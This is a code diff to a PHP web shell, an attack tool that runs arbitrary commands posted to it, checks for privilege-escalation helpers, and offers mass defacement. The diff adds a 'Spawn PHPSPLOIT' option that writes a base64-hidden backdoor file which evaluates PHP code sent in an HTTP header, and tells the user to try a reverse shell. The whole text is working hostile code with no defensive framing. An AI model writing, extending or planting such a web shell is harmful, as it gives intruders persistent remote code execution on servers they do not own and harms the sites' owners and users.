@@ -9,6 +9,14 @@ $gcc = (@shell_exec('gcc --version')) ? "<font color='lime'>ON</font>" : "<font 
 $pkexec = (@shell_exec('pkexec --version')) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
 $disfuncs = @ini_get("disable_functions");
 $showdisbfuncs = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<font color='lime'>NONE</font>";
+
+function doFile($name, $content, $type) {
+    $open = fopen($name, $type);
+    $write = fwrite($open, $content);
+    fclose($open);
+
+    return ($write !== false) ? true : false;
+}
 ?>
 
 <!DOCTYPE html>
@@ -166,6 +174,16 @@ $showdisbfuncs = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<
         if (isset($_POST["exec"])) {
             echo "<textarea class='terminal' disabled>" . @shell_exec($_POST["cmd"]) . "</textarea>";
         }
+    } elseif (isset($_GET["phpsploit"])) {
+        $content = "PD9waHAgQGV2YWwoJF9TRVJWRVJbJ0hUVFBfUEhQU1BMMDFUJ10pOyA/Pg==";
+        $create = doFile("phpsploit.php", base64_decode($content), "w");
+
+        if ($create) {
+            echo "<a href='phpsploit.php'>phpsploit.php</a> has been spawned!<br>";
+            echo "You can now try to reverse shell";
+        } else {
+            echo "phpsploit.php failed to spawned!";
+        }
     }
     ?>
 
@@ -174,6 +192,7 @@ $showdisbfuncs = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<
         <a href="?cmd">Terminal</a>
         <a href="?network">Network</a>
         <a href="?mass">Mass Deface</a>
+        <a href="?phpsploit">Spawn PHPSPLOIT</a>
     </div>
 </body>
 
